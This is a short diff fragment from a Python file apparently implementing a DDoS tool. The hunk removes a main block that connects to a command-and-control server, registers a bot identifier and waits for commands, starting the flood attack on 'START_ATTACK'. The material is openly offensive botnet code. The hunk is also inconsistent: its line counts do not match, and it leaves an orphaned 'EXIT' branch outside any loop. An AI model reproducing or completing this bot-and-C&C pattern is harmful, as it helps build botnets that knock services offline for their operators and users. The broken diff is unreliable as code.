@@ -195,28 +195,6 @@ class DDoSAttackTool:
     def run(self):
         self.root.mainloop()
 
-if __name__ == "__main__":
-    # Connect to the C&C server
-    cnc_server_ip = "192.168.0.1"  # Replace with the IP address of your C&C server
-    cnc_server_port = 1234  # Replace with the port number of your C&C server
-
-    bot_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    bot_socket.connect((cnc_server_ip, cnc_server_port))
-
-    # Send registration message to the C&C server
-    bot_id = "bot1"  # Replace with a unique identifier for each bot
-    registration_message = f"REGISTER {bot_id}"
-    bot_socket.send(registration_message.encode())
-
-    # Receive commands from the C&C server and execute them
-    while True:
-        command = bot_socket.recv(1024).decode()
-        if command == "START_ATTACK":
-            tool = DDoSAttackTool()
-            tool.start_attack()
-        elif command == "STOP_ATTACK":
-            # Implement code to stop the attack
-            pass
         elif command == "EXIT":
             break
 
